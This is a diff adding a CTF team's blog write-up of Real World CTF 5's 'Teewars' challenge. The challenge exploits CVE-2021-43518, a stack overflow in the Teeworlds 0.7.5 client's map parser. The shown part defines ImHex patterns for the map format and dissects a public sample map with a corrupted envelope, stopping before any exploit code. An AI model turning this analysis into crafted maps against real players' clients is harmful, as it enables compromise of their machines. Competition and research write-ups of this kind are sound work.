@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Real World CTF 5 - Teewars :: CyberTaskForce Zero</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Let&#39;s have some fun with Teeworlds! Not play it but pwn it!" />
+<meta name="keywords" content="ctf tu-bs stratum0" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/realworldctf5-teewars/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Real World CTF 5 - Teewars">
+<meta property="og:description" content="Let&#39;s have some fun with Teeworlds! Not play it but pwn it!" />
+<meta property="og:url" content="/posts/realworldctf5-teewars/" />
+<meta property="og:site_name" content="CyberTaskForce Zero" />
+
+  
+    <meta property="og:image" content="/img/favicon/orange.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2023-01-11 19:51:16 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    CTF0
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/realworldctf5-teewars/">Real World CTF 5 - Teewars</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2023-01-11
+        
+      </span>
+    
+    
+      <span class="post-author">:: Minei3oat</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/pwn/">pwn</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="disclaimer">Disclaimer<a href="#disclaimer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We played as part of <a href="https://ctftime.org/team/54748">Sauercloud</a>.</p>
+<h1 id="service">Service<a href="#service" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This challenge targets a Teeworlds client. The provided service runs a client connecting with a server for retrieving a map and starting a multiplayer game. For interaction, a rust script is used which asks for the IP address of the server and forwards <code>stdout</code> and <code>stderr</code> of the client to us. Furthermore the Dockerfile for the service is provided. It compiles the current version, 0.7.5, from source without PIE (<code>-no-pie</code>) and stack canaries (<code>-fno-stack-protector</code>).</p>
+<h1 id="vulnerability">Vulnerability<a href="#vulnerability" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>A quick search revealed <a href="https://www.cvedetails.com/cve/CVE-2021-43518/">CVE-2021-43518</a>, which reports a stack buffer overflow in the given version. Attached to the CVE is a <a href="https://mmmds.pl/fuzzing-map-parser-part-1-teeworlds/">blog post</a> and a <a href="https://github.com/teeworlds/teeworlds/issues/2981">github issue</a> with additional information about this vulnerability. From the issue we can download a sample map triggering the overflow and find a merged <a href="https://github.com/teeworlds/teeworlds/pull/3018">pull reqeust</a> fixing the overflow.</p>
+<p>By looking at the fix, we can easily spot the buffer overflow occuring during the parsing of the map file in <a href="https://github.com/teeworlds/teeworlds/blob/0.7.5/src/game/client/components/maplayers.cpp#L257"><code>CMapLayers::LoadEnvPoints</code></a>. So let&rsquo;s first make an excurse to the map file format.</p>
+<h2 id="map-files">Map files<a href="#map-files" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>During this excurse we will build an <a href="https://github.com/WerWolv/ImHex">ImHex</a> pattern for easier inspection and manipulation of map files during the exploit. ImHex offers a C-like <a href="https://imhex.werwolv.net/docs/index.html">pattern language</a> to parse files, allowing the user to display and inspect binary files in a understandable, structured way. Apart from a slightly different a naming and some quality of live features, such as annotating structures with the result of functions, the main difference to C is the ability to use conditions and loops inside struct definitions.</p>
+<p>A map file starts with a header followed by an index for faster access of items and data. After that, the items are saved and the file is concluded with data. In version 4 of the map file format, the data is compressed with zlib. Because ImHex does not support zlib inflate, we won&rsquo;t look at it. But this is no problem, since the buffer overflow occurs during parsing of the EnvPoints, which are stored in an item (more about that later). As the placement of the data section is determined by the informations from the header, we should do the same to get view parity with Teeworlds. As ImHex parses the definitions from top to bottom, the following snippets must be prepended to the ones before.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CDataFile</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// header
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    CDatafileHeader header;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// index
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    CDatafileItemType m_pItemTypes[header.m_NumItemTypes];
+</span></span><span style="display:flex;"><span>    s32 m_pItemOffsets[header.m_NumItems];
+</span></span><span style="display:flex;"><span>    s32 m_pDataOffsets[header.m_NumRawData];
+</span></span><span style="display:flex;"><span>    s32 m_pDataSizes[header.m_NumRawData];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// items
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    CDatafileItem items[header.m_NumItems];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// (zlib deflated) data
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">u8</span> data[header.m_DataSize] <span style="color:#f92672">@</span> addressof(items) <span style="color:#f92672">+</span> header.m_ItemSize;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// file starts at byte 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>CDataFile file <span style="color:#f92672">@</span> <span style="color:#ae81ff">0x00</span>;
+</span></span></code></pre></div><p>The header contains basic information about the map, including the version and the number of items and data entries and the total size of all items and data.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CDatafileHeader</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> m_aID[<span style="color:#ae81ff">4</span>];  <span style="color:#75715e">// &#34;DATA&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>    s32 m_Size;
+</span></span><span style="display:flex;"><span>    s32 m_Swaplen;
+</span></span><span style="display:flex;"><span>    s32 m_NumItemTypes;
+</span></span><span style="display:flex;"><span>    s32 m_NumItems;
+</span></span><span style="display:flex;"><span>    s32 m_NumRawData;
+</span></span><span style="display:flex;"><span>    s32 m_ItemSize;
+</span></span><span style="display:flex;"><span>    s32 m_DataSize;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The following array of item types just lists the start index and the number of items for each type present in the map. Teeworlds has 7 different item types. The relevant ones for the exploit will be the <code>Envelope</code> and the <code>Envelope_Points</code> item type. Since enums are strictly typed in ImHex and we will need the type later with only 16 bits, we will define the remaining two bytes as padding. This ignores the relevance of the last two bytes but allows us to reuse the enum later.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">type_id</span> : <span style="color:#a6e22e">s16</span> {
+</span></span><span style="display:flex;"><span>    Version <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    Info <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    Image <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>    Envelope <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>,
+</span></span><span style="display:flex;"><span>    Group <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>,
+</span></span><span style="display:flex;"><span>    Layer <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>,
+</span></span><span style="display:flex;"><span>    Envelope_Points <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>,
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CDatafileItemType</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    type_id m_Type;
+</span></span><span style="display:flex;"><span>    padding[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>    s32 m_Start;
+</span></span><span style="display:flex;"><span>    s32 m_Num;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Before looking into the different item types, let&rsquo;s have a look at their common structure. Each item starts unique identifier formed by an ID unique in the scope of that item type and it&rsquo;s type. This identifier is followed by the size of the following data. The definition of the data section illustrates the power of ImHex: depending on the type parsed earlier in the struct, we can specify different alternatives for the remaining content of the struct. By inlining the structs, we can flatten the hirachy. In addition, we will use a function to display ithe item&rsquo;s type in the pattern view&rsquo;s value column allowing us to see the item&rsquo;s type without unfolding them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">show_type</span>(auto to_show) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> to_show.m_Type;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CDatafileItem</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    s16 m_ID;
+</span></span><span style="display:flex;"><span>    type_id m_Type;
+</span></span><span style="display:flex;"><span>    s32 m_Size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> type_id::Version) {
+</span></span><span style="display:flex;"><span>       CMapItemVersion version [[inline]];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> type_id::Info) {
+</span></span><span style="display:flex;"><span>       CMapItemInfo info [[inline]];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> type_id::Image) {
+</span></span><span style="display:flex;"><span>       CMapItemImage image [[inline]];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> type_id::Envelope) {
+</span></span><span style="display:flex;"><span>       CMapItemEnvelope envelope [[inline]];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> type_id::Group) {
+</span></span><span style="display:flex;"><span>       CMapItemGroup group [[inline]];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> type_id::Layer) {
+</span></span><span style="display:flex;"><span>       CMapItemLayer layer [[inline]];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> type_id::Envelope_Points) {
+</span></span><span style="display:flex;"><span>        CEnvPoint points[m_Size<span style="color:#f92672">/</span>sizeof(CEnvPoint)] [[inline]];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} [[format(<span style="color:#e6db74">&#34;show_type&#34;</span>)]];
+</span></span></code></pre></div><p>Despite not needing the other item types, we will shortly define them, as this allows us to get a better overview of the map file. Furthermore, this allows us to skip the parsing of the offsets by relying on their correctnes. The following definitions are copied from Teeworlds&rsquo; <a href="https://github.com/teeworlds/teeworlds/blob/0.7.5/src/game/mapitems.h"><code>mapinfo.h</code></a> and only adjusted by merging the different versions of the struct and changing their datatypes to the corresponding ones in ImHex. An explanation for the types can be found at the documentation of <a href="https://github.com/heinrich5991/libtw2/blob/master/doc/map.md">libtw2</a>, a Rust implementation for some features of Teeworlds.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CPoint</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    s32 x, y; <span style="color:#75715e">// 22.10 fixed point
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CColor</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    s32 r, g, b, a;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CQuad</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    CPoint m_aPoints[<span style="color:#ae81ff">5</span>];
+</span></span><span style="display:flex;"><span>    CColor m_aColors[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>    CPoint m_aTexcoords[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s32 m_PosEnv;
+</span></span><span style="display:flex;"><span>    s32 m_PosEnvOffset;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s32 m_ColorEnv;
+</span></span><span style="display:flex;"><span>    s32 m_ColorEnvOffset;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CTile</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">u8</span> m_Index;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">u8</span> m_Flags;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">u8</span> m_Skip;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">u8</span> m_Reserved;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CMapItemInfo</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// enum { CURRENT_VERSION=1 };
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>    s32 m_Author;
+</span></span><span style="display:flex;"><span>    s32 m_MapVersion;
+</span></span><span style="display:flex;"><span>    s32 m_Credits;
+</span></span><span style="display:flex;"><span>    s32 m_License;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">image_format</span> : <span style="color:#a6e22e">s32</span> {
+</span></span><span style="display:flex;"><span>    RGB <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    RGBA
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CMapItemImage</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>    s32 m_Width;
+</span></span><span style="display:flex;"><span>    s32 m_Height;
+</span></span><span style="display:flex;"><span>    s32 m_External;
+</span></span><span style="display:flex;"><span>    s32 m_ImageName;
+</span></span><span style="display:flex;"><span>    s32 m_ImageData;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (m_Version <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        image_format m_Format;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CMapItemGroup</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>    s32 m_OffsetX;
+</span></span><span style="display:flex;"><span>    s32 m_OffsetY;
+</span></span><span style="display:flex;"><span>    s32 m_ParallaxX;
+</span></span><span style="display:flex;"><span>    s32 m_ParallaxY;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s32 m_StartLayer;
+</span></span><span style="display:flex;"><span>    s32 m_NumLayers;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (m_Version <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        s32 m_UseClipping;
+</span></span><span style="display:flex;"><span>        s32 m_ClipX;
+</span></span><span style="display:flex;"><span>        s32 m_ClipY;
+</span></span><span style="display:flex;"><span>        s32 m_ClipW;
+</span></span><span style="display:flex;"><span>        s32 m_ClipH;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s32 m_aName[<span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">tilemap_flags</span> :<span style="color:#a6e22e">s32</span> {
+</span></span><span style="display:flex;"><span>    Tiles <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    Game  <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CMapItemLayerTilemap</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// enum { CURRENT_VERSION=4 };
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s32 m_Width;
+</span></span><span style="display:flex;"><span>    s32 m_Height;
+</span></span><span style="display:flex;"><span>    tilemap_flags m_Flags;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    CColor m_Color;
+</span></span><span style="display:flex;"><span>    s32 m_ColorEnv;
+</span></span><span style="display:flex;"><span>    s32 m_ColorEnvOffset;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s32 m_Image;
+</span></span><span style="display:flex;"><span>    s32 m_Data;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s32 m_aName[<span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CMapItemLayerQuads</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// enum { CURRENT_VERSION=2 };
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s32 m_NumQuads;
+</span></span><span style="display:flex;"><span>    s32 m_Data;
+</span></span><span style="display:flex;"><span>    s32 m_Image;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    s32 m_aName[<span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">layer_type</span> : <span style="color:#a6e22e">s32</span> {
+</span></span><span style="display:flex;"><span>    Invalid,
+</span></span><span style="display:flex;"><span>    Game,
+</span></span><span style="display:flex;"><span>    Tiles,
+</span></span><span style="display:flex;"><span>    Quads
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CMapItemLayer</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>    layer_type m_Type;
+</span></span><span style="display:flex;"><span>    s32 m_Flags;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> layer_type::Tiles) {
+</span></span><span style="display:flex;"><span>        CMapItemLayerTilemap m_Tilemap;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (m_Type <span style="color:#f92672">==</span> layer_type::Quads) {
+</span></span><span style="display:flex;"><span>        CMapItemLayerQuads m_Quads;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CMapItemVersion</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>With that big chunk of the file structure out of the way, let&rsquo;s have a closer look at the relevant parts: Envelopes and Envelope Points.</p>
+<p>An Envelope groups a range of points. The type of these points is defined by the number of channels. Furthermore the version of the envelope influences the parsing of the points for that envelope. Since all envelopes should have the same version, we can simply track the required point version with a global variable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span>s32 POINT_VERSION <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>; <span style="color:#75715e">// track point version
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CMapItemEnvelope</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// enum { CURRENT_VERSION=3 };
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    s32 m_Version;
+</span></span><span style="display:flex;"><span>    s32 m_Channels;
+</span></span><span style="display:flex;"><span>    s32 m_StartPoint;
+</span></span><span style="display:flex;"><span>    s32 m_NumPoints;
+</span></span><span style="display:flex;"><span>    s32 m_aName[<span style="color:#ae81ff">8</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (m_Version <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {   <span style="color:#75715e">// technically this should be &gt;1,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                            <span style="color:#75715e">// but for successfully reading the corrupted sample map
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                            <span style="color:#75715e">// without parsing the offsets,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                            <span style="color:#75715e">// this change is needed to not fail
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        s32 m_Synchronized;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (m_Version <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>        POINT_VERSION <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Each point has a time and a curve type. Furthermore it features 4 values which are used according to the channels value of the containing envelope. With version 2, a point is increased by 4 tangent arrays containing 4 values each.
+For getting the <code>sizeof</code> operator used in <code>CDatafileItem</code> to work, we have to define the <code>CEnvPoint</code> struct as static. This is possible, since all points have the same layout. Furthermore, the static definition optimizes the parsing of the file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Rust" data-lang="Rust"><span style="display:flex;"><span><span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">curve_id</span> : <span style="color:#a6e22e">s32</span> {
+</span></span><span style="display:flex;"><span>    Step   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,      <span style="color:#75715e">// (abrupt drop at second value)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Linear <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,      <span style="color:#75715e">// (linear value change)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Slow   <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>,      <span style="color:#75715e">// (first slow, later much faster value change)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Fast   <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>,      <span style="color:#75715e">// (first fast, later much slower value change)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Smooth <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>,      <span style="color:#75715e">// (slow, faster, then once more slow value change)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Bezier <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>       <span style="color:#75715e">// (Vanilla only, very customizable curve)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CEnvPoint</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    s32 m_Time; <span style="color:#75715e">// in ms
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    curve_id m_Curvetype;
+</span></span><span style="display:flex;"><span>    s32 m_aValues[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// 1-4 depending on envelope (22.10 fixed point)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (POINT_VERSION <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// bezier curve only
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// dx in ms and dy as 22.10 fxp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        s32 m_aInTangentdx[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>        s32 m_aInTangentdy[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>        s32 m_aOutTangentdx[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>        s32 m_aOutTangentdy[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//bool operator&lt;(const CEnvPoint&amp; other) const { return m_Time &lt; other.m_Time; }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} [[<span style="color:#66d9ef">static</span>]];
+</span></span></code></pre></div><p>With these information we can take a closer look at the provided map and it&rsquo;s effect on Teeworlds.
+<img src="/img/realworldctf5-teewars-pattern_data.png" alt="Screenshot of the pattern data in ImHex">
+It features 27 items from which 6 are envelopes. All envelopes except the one with ID 1 are version 3 and fulfill the relevant constraints. The envelope with ID 1 has a version of -65533 (0xffff0003) and features 2 points with 65535 channels each.</p>
+<p>Since we now know the map file, let&rsquo;s have a closer look at the broken part of the parsing.</p>
